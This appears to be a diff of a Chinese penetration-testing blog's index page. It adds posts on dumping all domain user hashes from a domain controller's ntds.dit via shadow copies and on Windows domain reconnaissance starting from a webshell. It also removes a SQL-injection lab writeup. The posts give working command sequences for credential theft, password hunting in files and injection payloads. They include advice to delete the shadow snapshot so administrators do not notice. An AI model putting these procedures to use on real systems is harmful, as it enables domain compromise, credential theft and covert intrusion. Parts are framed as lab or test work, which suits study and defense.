@@ -139,6 +139,146 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/08/13/vssown-vbs-libesedb-NtdsXtract/">
+                完整导出域内用户hash小记 [vssown.vbs + libesedb + NtdsXtract]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-13</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/domainhash/">domainhash</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>本地测试环境:<br>&nbsp;&nbsp;&nbsp;&nbsp;域控 2008 r2 64bit</p>
+<p>离线利用linux提取域内所有用户hash,实际测试可行,不过文件确实有点儿大,用于测试的系统域内用户只有十个左右,却已经打了12M[按这样算的话,一千个用户也就将近1G],如果用户量特别大的话,可想而知,不过好在信息非常全:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vssown.vbs + libesedb + NtdsXtract</div></pre></td></tr></table></figure></p>
+<p>查看vssown.vbs帮助:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs</div></pre></td></tr></table></figure></p>
+<p><img src="/img/vssown help.png" alt=""><br></p>
+<p>第一步,启动服务:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /start</div><div class="line">cscript vssown.vbs /status</div></pre></td></tr></table></figure></p>
+<p><img src="/img/vssown start stutas.png" alt=""><br></p>
+<p>第二步,创建快照:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /create C</div><div class="line">cscript vssown.vbs /list</div></pre></td></tr></table></figure></p>
+<p><img src="/img/vssown create list.png" alt=""><br></p>
+<p>第三步,把SYSTEM和ntds.dit文件都复制回本地,如果比较多,下回本地确实有点儿麻烦:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system .</div><div class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit .</div></pre></td></tr></table></figure></p>
+<p><img src="/img/vssown copy.png" alt=""><br></p>
+<p>第四步,删除快照,这非常重要,千万不要忘了,不然被管理员看到就不太好了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /delete *</div></pre></td></tr></table></figure></p>
+<p><img src="/img/vssown delete.png" alt=""><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cscript vssown.vbs /stop</div></pre></td></tr></table></figure>
+<p><img src="/img/vssown stop.png" alt=""><br></p>
+<p>第五步,在本地编译安装好libesedb 和 NTDSXtract,这里我把它俩都放到同级目录中了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ./configure</span></div><div class="line"><span class="comment"># make</span></div><div class="line"><span class="comment"># cd esedbtools/</span></div><div class="line"><span class="comment"># ./esedbexport ./ntds.dit   这里我已经把ntds.dit复制到当前目录下了</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/esedbexport.png" alt=""><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># mv ntds.dit.export/ ../../</span></div><div class="line"><span class="comment"># cd ../../</span></div><div class="line"><span class="comment"># cd NTDSXtract\ 1.0/</span></div><div class="line"><span class="comment"># python dsusers.py  ../ntds.dit.export/datatable.3  ../ntds.dit.export/link_table.5 --passwordhashes '/root/SYSTEM' 这里的SYSTEM文件最好给绝对路径</span></div></pre></td></tr></table></figure>
+<p><img src="/img/vssown hash.png" alt=""><br><br><img src="/img/vssown krbtgt.png" alt=""><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/08/11/domain-info-search/">
+                域内信息搜集实战
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-08-11</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/active-pentest/">active pentest</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 搜集本机信息:</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;这里就以拥有一个域内网中的普通用户[注意,这里并不是域用户哦]权限的机器的webshell作为我们整个域内渗透的开始,首先,没别的,先搜集下各种信息,主要是搜集各类账号密码,自然是翻到的越多越好(多一个有用的密码或hash就多一条生路),废话不多说,我们开始正题,从搜集本机信息开始,理论上来讲,拿到webshell的第一反应,没别的,先看下当前用户的系统权限再说,直接是system权限的这种情况咱们找时间另说,就先以一个很普通的网站用户权限,来继续我们下面的内容,whoami加上all参数可以把当前用户的sid也顺带查出来,只是告诉大家可以用这种方式查用户sid,虽然这个用户的sid没什么卵用,但如果是域管的就不一样了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># whoami  /all</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/whoami all.jpg" alt="&#39;&#39;"></p>
+<p>接着再来看看本机的网络配置,主要是想看看当前机器是否处在内网,有几个内网,内网段分别是多少,是否是在域内网,网关是多少,dns指向的ip是哪里,当然,你也可以用wmic来查,但那个显示的并不是很完整,个人早已习惯了ipconfig /all,所以就用这个了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ipconfig /all</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/ipconfig all.jpg" alt="&#39;&#39;"></p>
+<p>查看所有登录到当前系统中的用户状态,主要还是想看看管理员在不在(哪怕不在,最近登录过也好,加入提成了,还能抓下历史明文),当然,query的用法并非仅限于此,关于query 的更多用法,请自行查看该命令帮助<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># query user</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/query ueser.jpg" alt="&#39;&#39;"></p>
+<p>看下当前系统中的所有网络连接(包括tcp和udp的),以及每个连接所对应的发起程序,主要是想看看有没有我们可以快速利用到的一些服务,运气好的情况下,你甚至可以看到同行的tcp马还在上面,如果是域控机器,这个连接[udp]可能会有非常多,你可以选择先把它重定向到文件然后下下来看<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netstat -ano | more</span></div><div class="line"><span class="comment"># netstat -anob &gt;&gt; portres.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/netstat ano.jpg" alt="&#39;&#39;"></p>
+<p>查下本机的arp记录,看看最近和本机通信过的其它内网机器,在这里也许你会发现其它工具扫不到的机器和网段<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># arp -a</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/arpa.jpg" alt="&#39;&#39;"></p>
+<p>看看本机的防火墙配置及状态,win建议用’netsh advfirewall firewall’,看你心情,随便用哪个,反正只是用个工具而已,能出正确的结果即可,不纠结<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netsh firewall show config</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/netsh firesall.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># netsh advfirewall firewall show rule name=all | more  </span></div><div class="line"><span class="comment"># netsh firewall show state</span></div></pre></td></tr></table></figure>
+<p><img src="/img/netsh statues.jpg" alt="&#39;&#39;"> </p>
+<p>查看当前机器本地系统中的环境变量,主要是想瞅瞅path里面有没有我们可以利用到的一些运行环境,比如py,java(免杀效果好,不过这个,一般权限也比较高),ps(免杀效果好),ruby,perl等等……这样一来会方便我们后续用一些外部工具<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># set</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/set.jpg" alt="&#39;&#39;"></p>
+<p>获取本机的mac,伪造mac可能会用得上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># getmac</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/getmac.jpg" alt="&#39;&#39;"></p>
+<p>查看当前windows的内核版本,其实可以忽略,systeminfo一下就搞定了,如果你只是想快速的看下当前系统的内核版本,不妨用用<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># ver</span></div></pre></td></tr></table></figure></p>
+<p>查看当前系统中安装的所有软件及软件所对应的具体版本,看看有没有我们提权能用到的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic product get name,version</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wmic programcs.jpg" alt="&#39;&#39;"></p>
+<p>查看当前系统中各个分区的大概使用情况,拷文件的时候心里有个谱<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wmic diskcs.jpg" alt="&#39;&#39;"></p>
+<p>看下当前系统的补丁打的如何,因为数据比较多时间较长,菜刀里面很容易超时,不过,多试几次就好了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic qfe get CSName,Description,hotfixid</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wmic kb.jpg" alt="&#39;&#39;"></p>
+<p>当然,你还有更简单直观的命令可以选择,查看当前系统的详细配置,不过回显的内容比较多,可能也会出现超时的情况<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># systeminfo</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/systeminfos.jpg" alt="&#39;&#39;"></p>
+<p>快速定位一些能提权的补丁编号,当然,你要自己针对目标的系统(03和08以上最好分开单独准备)事先准备好一些补丁号,记得务必要在可读写目录中执行该语句,因为它要创创建临时文件<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># systeminfo&gt;temp.txt&amp;(for %i in (KB2271195 KB2124261 KB2160329 KB2621440  KB2707511 KB2829361 KB2864063 KB3000061 KB3045171 KB3036220 KB3077657 KB3079904 KB3134228 KB3124280 KB3199135) do <span class="doctag">@type</span> temp.txt|<span class="doctag">@find</span> /i  "%i"|| <span class="doctag">@echo</span> %i Not Installed!)&amp;del /f /q /a temp.txt</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/kbfinds.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3079904" 这是补丁安装后的状态</span></div></pre></td></tr></table></figure>
+<p><img src="/img/wmicfindkb.jpg" alt="&#39;&#39;"></p>
+<p>查看当前机器所安装的驱动,必要的时候,兴许对提权有些帮助,不过对虚拟机可能并没什么卵用,如果是实体物理机兴许还能利用上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># driverquery</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/driveers.jpg" alt="&#39;&#39;"></p>
+<p>查看当前机器的开启了哪些共享<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net share </span></div><div class="line"><span class="comment"># net share \\hostname 	查看指定的远程机器所开放的共享</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/net share.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic share  get name,path,status  利用wmic查找共享</span></div></pre></td></tr></table></figure>
+<p>如果有条件的情况下,可以跟踪下路由,看看出口的公网ip,时间可能比较长(毕竟一跳一跳的走,中间一个超时就会卡很久),如果是菜刀可能会超时<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tracert www.google.com</span></div></pre></td></tr></table></figure></p>
+<p>查看当前机器都起了哪些进程,主要是想看看用的什么杀软,什么监控,什么服务等等……心里先有个底<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tasklist /svc</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/tasklist svc.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># tasklist /V  看下发起进程的用户身份,当然,你只能看到你有权限看到的</span></div></pre></td></tr></table></figure>
+<p><img src="/img/tasklist v.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># wmic process where name='*.exe' list full   查询某个进程所对应某个具体的可执行程序是什么</span></div></pre></td></tr></table></figure>
+<p><img src="/img/wicic exe.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># hostname 	  查看当前机器的主机名</span></div><div class="line"><span class="comment"># net start 	  查看当前系统已经启动的一些服务,注意这里的*scanner,很显然,已经有同行搞过,信心是不是有大了一点呢,嘿嘿……</span></div><div class="line"><span class="comment"># net session 	  查看当前系统正在连接的会话有哪些,权限要够,菜刀用的组件可能权限不允许,换大马会好点</span></div><div class="line"><span class="comment"># net user	  查看本地所有的用户名</span></div><div class="line"><span class="comment"># net localgroup  查看本地所有的组名</span></div><div class="line"><span class="comment"># net localgroup "administrators" 查看指定组中的所有成员</span></div><div class="line"><span class="comment"># net localgroup "remote desktop users" 远程桌面组,如果你想要某个用户能进行远程桌面连接,可能需要把它加到该组中</span></div><div class="line"><span class="comment"># net accounts 	  查看本机的账号密码设置策略,添加用户的时候可能要注意下</span></div><div class="line"><span class="comment"># route print     打印下当前系统路由信息</span></div><div class="line"><span class="comment"># schtasks /query /fo list /v    查看本机的计划任务列表,win7以后就淘汰at了,不得不说schtasks是个非常好用的工具</span></div></pre></td></tr></table></figure>
+<p>找当前用户可读写目录,可能会很多,一般把根放在网站目录就好了,当然,你也可以传一些目录读写查询的小脚本来搞<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># dir /a-r-d /s /b</span></div></pre></td></tr></table></figure></p>
+<p>setuid程序探测<br></p>
+<p>除此之外,千万别忘了多去菜刀里面翻翻目录文件,兴趣能还能找到点儿有用的东西,有权限的情况下能翻多深就翻多深,另外,确实还有很多专门针对提权方面的系统信息探测,篇幅限制,到时会再单独拿出来做详细说明<br><br></p>
+<p>0x02 搜集域内简要信息(期间务必仔细做好记录):<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net user /domain 	查看当前域中的所有用户名,根据用户名总数大概判断域的规模</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/net user domain.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net user epoadmin /domain  查看指定用户在当前域中的详细属性信息</span></div></pre></td></tr></table></figure>
+<p><img src="/img/net user epoadmin admin.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net accounts /domain 		查看当前域的域内账户密码设置策略</span></div><div class="line"><span class="comment"># net config workstation       	看看当前的登录域</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net view 	正常情况下可以用该命令查看当前域中在线的机器有哪些,但这样看着确实不太直观,稍微用批处理搞一下把机器名对应的ip也显示出来,岂不更畅快</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">@echo off</div><div class="line">setlocal ENABLEDELAYEDEXPANSION</div><div class="line">@FOR /F <span class="string">"usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "</span>命令成功完成<span class="string">" /v ^|find "</span>The command completed successfully.<span class="string">" /v`) DO (</span></div><div class="line">@FOR /F "usebackq delims=<span class="string">" %%i IN (`@ping -n 1 -4 %%j ^| findstr "</span>Pinging<span class="string">"`) DO (</span></div><div class="line">@FOR /F "usebackq tokens=<span class="number">2</span> delims=[]<span class="string">" %%k IN (`echo %%i`) DO (echo %%k %%j)</span></div><div class="line">)</div><div class="line">)</div></pre></td></tr></table></figure>
+<p><img src="/img/netviewtoip.jpg" alt="&#39;&#39;"></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># net view /domain       		 查看所有的域名称</span></div><div class="line"><span class="comment"># net view /domain:PROGRAM 		 查看指定域中在线的计算机列表</span></div><div class="line"><span class="comment"># net time /domain			 查看主域位置,一般都会把主域作为时间服务器</span></div><div class="line"><span class="comment"># net group /domain			 查看当前域中的所有组名</span></div><div class="line"><span class="comment"># net group "domain admins" /domain 	 看看当前域中的域管都有谁</span></div><div class="line"><span class="comment"># net group "domain computers" /domain 	 看看当前域中的所有的计算机名,应该是只要登录过该域计算机名都会被保存下来</span></div><div class="line"><span class="comment"># net group "domain controllers" /domain 看看域控是哪几个</span></div><div class="line"><span class="comment"># nltest /domain_trusts 		 查看域信任关系</span></div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># dsquery computer 				   查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个和目标系统版本对应的dsquery</span></div><div class="line"><span class="comment"># dsquery user 					   查看当前域中的所有账户名</span></div><div class="line"><span class="comment"># dsquery group 				   查看当前域内的所有组名</span></div><div class="line"><span class="comment"># dsquery subnet 				   查看到当前域所在的网段</span></div><div class="line"><span class="comment"># dsquery site 					   查看域内网站</span></div><div class="line"><span class="comment"># dsquery server				   查看当前域中的所有服务器(应该是指域控)</span></div><div class="line"><span class="comment"># dsquery user domainroot -name admin* -limit 240  查询前240个以admin开头的用户名</span></div></pre></td></tr></table></figure>
+<p>0x03 尽可能多的搜集本机的各种密码数据,关键字大家随意,这里只是给几个常见的:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># dir /b /s config.* 			搜集本机所有的配置文件路径</span></div><div class="line"><span class="comment"># dir /b /s login*txt 			也有一些管理员笔记喜欢用txt记录一些服务配置或者密码信息</span></div><div class="line"><span class="comment"># dir /b /s login*			所有带有login字段的文件名</span></div><div class="line"><span class="comment"># dir /b /s *.bak			所有以bak为后缀的的文件名</span></div><div class="line"><span class="comment"># dir /b /s *.config            	所有以config为后缀的文件名</span></div></pre></td></tr></table></figure></p>
+<p>在所有后缀为asp,ini,txt,php,aspx……的文件中找到带有password字符串文件,查询的时间可能会比较长,菜刀可能又会超时,另外,这样这里所有的查找都以当前路径为基础的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># findstr /si password *.ini *.txt *.asp *.cgi  </span></div><div class="line"><span class="comment"># findstr /si password *.ini *.txt *.aspx </span></div><div class="line"><span class="comment"># findstr /si password *.ini *.txt *.php</span></div><div class="line"><span class="comment"># findstr /si password *.ini *.txt *.php *.xml</span></div></pre></td></tr></table></figure></p>
+<p>0x04 更多,待续……</p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于域内信息搜集这里只是粗略零碎的提到了一些,确实还有很多很精悍的搜集技巧,都没提到,不过,那都是后话,比如,关于内网大致拓扑结构信息,端口服务信息….篇幅原因,压根也没提到,来日方长,我们还是循序渐进吧,’步子太大容易扯着蛋’,这次顶多先入个门,主要还是想借此说明,利用系统现有的工具在现有的权限条件下,我们到底能做些什么,务必要时刻谨记我们搜集信息的初衷(严禁盲目),你所搜到的每个信息,都应该有它存在的价值,也就是说后续我们到底可以拿它些什么,这非常无比的重要,举个简单例子,就拿搜集密码来说,首先我要知道哪些地方可能会存有密码,我们可能知道,各种数据库配置文件有数据库的连接密码(sa&amp;root),各种第三方工具的配置文件中可能也保存的也有密码hash(比如,filezilla之流),浏览器中说不定保存的也有密码各种网站密码(找找有没有是目标网站的,想办法登进去传shell也是可以的),如果你运气不错,搞到了vpn账号密码岂不快哉,等等……其实,在你权限和免杀都没问题的情况下,要搜集的密码还有很多,关于更多搜集密码,猜密码的东西,后续会单独梳理出来,说了这么多废话,最终目的也只是想说明,如果大家只是照本宣科的把命令行尸走肉的过一遍,可以很负责任的告诉大家,几乎是没有任何意义的,不是吗,这里都是一些基础的不能再基础的命令,使用也极其简单,能不能拿到有用的东西,关键还在人,对信息的敏感度一定要高,细心点就好了,再说一遍,’严禁盲目,严禁盲目,严禁盲目’,其实,我也一直在强调,工具是死的,人是活的,知道你想要做什么,比怎么做更重要,这里,仅供参考,有不对的地方,麻烦大家多批评指正,说实话,这样敲命令显的确实有点儿呆萌,你可以选择把它丢到脚本中,一键搞定,不过,容错可能要做好点,万一命令执行异常了(有可能错过重要信息),就不太好了,不过,我自己还是喜欢手工,要什么记录什么就好了,干嘛非要动不动搞一大堆没用的信息,看着都累,希望大家平时也是,务必要勤记录,这绝对是个好习惯,祝大家好运,也非常期待多跟大家一起交流,毕竟,个人的力量始终是有限的</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/08/10/ntlm-kerberos/">
                 深刻理解windows安全认证机制 [ntlm & Kerberos]
             </a>
@@ -736,155 +876,6 @@
 <p>此次要实现的大致架构如下:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">php5</span><span class="selector-class">.3</span><span class="selector-class">.27</span> + <span class="selector-tag">mysql-5</span><span class="selector-class">.5</span><span class="selector-class">.32</span> + <span class="selector-tag">nginx-1</span><span class="selector-class">.10</span><span class="selector-class">.3</span> + <span class="selector-tag">centOS6</span><span class="selector-class">.8_x64</span></div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2016/06/21/Oldlnmp/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/05/25/web-for-pentester/">
-                web for pentester writeup
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-05-25</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/pentestlab/">pentestlab</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入:"></a>sql注入:</h2><p>(1)没有任何过滤的拼接<br><img src="/img/sqli1.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example1.php?name=root' and 1=12 union select version(),user(),database(),4,5 --+-</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sqli1_s.png" alt="&#39;&#39;"><br></p>
-<p>(2)只过滤了空白符,用/**/代替即可<br><img src="/img/sqli2.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example2.php?name=root'/</span>**<span class="regexp">/and/</span>**<span class="regexp">/1=112/</span>**<span class="regexp">/union/</span>**<span class="regexp">/select/</span>**<span class="regexp">/1,database(),3,4,5/</span>**<span class="regexp">/%23</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sqli2_s.png" alt="&#39;&#39;"><br></p>
-<p>(3)跟上面一样,只不过这次过滤了多个空白符,bypass方法同上<br><img src="/img/sqli3.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example3.php?name=root'/</span>**<span class="regexp">/and/</span>**<span class="regexp">/1=12/</span>**<span class="regexp">/union/</span>**<span class="regexp">/select/</span>**<span class="regexp">/user(),2,3,4,5/</span>**<span class="regexp">/%23</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sqli3_s.png" alt="&#39;&#39;"><br></p>
-<p>(4)用mysql_real_escape_string()把传过来的id先转义再拼接,其实这里跟没任何过滤是一样的,因为我们的注入语句里根本也没有单引号这类敏感字符<br><img src="/img/sqli4.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example4.php?id=2 and 12=1 union select 1,version(),3,4,5 %23</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sqli4_s.png" alt="&#39;&#39;"><br></p>
-<p>(5)要求开头是任意数字,开头本来就是数字呀,搞不懂,所以根本不存在什么绕过,正常写注入语句即可<br><img src="/img/sqli5.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example5.php?id=2 and 1=12 union select version(),2,3,4,5 %23</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sqli5_s.png" alt="&#39;&#39;"><br></p>
-<p>(6)要求结尾是任意数字,那就按它说的呗,结尾随便给个数字就好了<br><img src="/img/sqli6.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example6.php?id=2 and 1=12 union select version(),2,3,4,5 %233</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sqli6_s.png" alt="&#39;&#39;"><br></p>
-<p>(7)注意这里的’/m修饰符,对,没错,就是它,表示多行匹配,所以用%0a换行下即可绕过<br><img src="/img/sqli7.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example7.php?id=2%0aand%0a1=112%0aunion%0aselect%0auser(),2,3,4,5%0a%23</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sqli7_s.png" alt="&#39;&#39;"><br></p>
-<p>(8)用mysql_real_escape_string()做了下转义,而后再拼接,不过需要注意下,这里是用反引号闭合的,虽然没法正常注入,不过盲注依然可行的<br><img src="/img/sqli8.png" alt="&#39;&#39;"><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/sqli</span><span class="regexp">/example8.php?order=name`,(if((ascii(mid((select version()),1,1))=53),sleep(5),1))%23</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/sqli8_s.png" alt="&#39;&#39;"></p>
